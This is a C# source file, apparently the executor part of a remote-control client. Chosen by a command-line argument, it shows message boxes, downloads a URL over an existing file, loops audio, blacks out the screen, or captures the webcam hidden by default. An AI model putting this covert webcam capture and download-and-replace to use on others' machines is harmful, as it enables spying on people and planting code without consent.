using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Threading;
using RemoteControl.Client.Excutor.Utils;

namespace RemoteControl.Client.Excutor
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length == 0)
                return;

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // 操作类型
            var type = args[0].ToLower();
            // 操作参数
            var paras = args.ToList();
            paras.RemoveAt(0);
            // 根据参数，执行不同的操作
            if (type == "msgbox")
            {
                MsgBoxHandler(paras);
            }
            else if (type == "downloader")
            {
                DownloadHandler(paras);
            }
            else if (type == "player")
            {
                PlayerHandler(paras);
            }
            else if (type == "blackscreen")
            {
                Application.Run(new FrmBlackScreen());
            }
            else if (type == "camcapture")
            {
                CamCaptureHandler(paras);
            }
            else
            {
                return;
            }
        }

        static void CamCaptureHandler(List<string> args)
        {
            bool isHide = true;
            int fps = 1;
            for (int i = 0; i < args.Count; i++)
            {
                string arg = args[i];
                string argLower = arg.ToLower();
                if (argLower.StartsWith("/s"))
                {
                    isHide = false;
                }
                else if (argLower.StartsWith("/fps:"))
                {
                    fps = Convert.ToInt32(arg.Substring(arg.IndexOf(":") + 1));
                }
            }
            Application.Run(new FrmCamCapture(isHide, fps));
        }

        static void PlayerHandler(List<string> args)
        {
            if (args.Count != 1)
            {
                return;
            }
            string path = args[0];
            if (!System.IO.File.Exists(path))
            {
                return;
            }
            WinMMPlayer player = new WinMMPlayer();
            player.StopMusic();
            player.PlayMusic(path);
            while (true)
            {
                Application.DoEvents();
                Thread.Sleep(1000);
            }
        }

        static void DownloadHandler(List<string> args)
        {
            if (args.Count != 2)
                return;

            var url = args[0];
            var filePath = args[1];
            try
            {
                // 下载文件
                System.Net.WebClient client = new System.Net.WebClient();
                var tempFilePath = filePath + ".tmp";
                client.DownloadFile(new Uri(url), tempFilePath);
                System.IO.File.Delete(filePath);
                System.IO.File.Move(tempFilePath, filePath);
                Thread.Sleep(3000);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void MsgBoxHandler(List<string> args)
        {
            if (args.Count == 4)
            {
                string text=args[0];
                string title=args[1];
                int buttonType = Convert.ToInt32(args[2]);
                int iconType = Convert.ToInt32(args[3]);
                try
                {
                    MessageBox.Show(text, title, (MessageBoxButtons)buttonType, (MessageBoxIcon)iconType);

                }
                catch (Exception ex)
                {
                }
            }
        }
    }
}
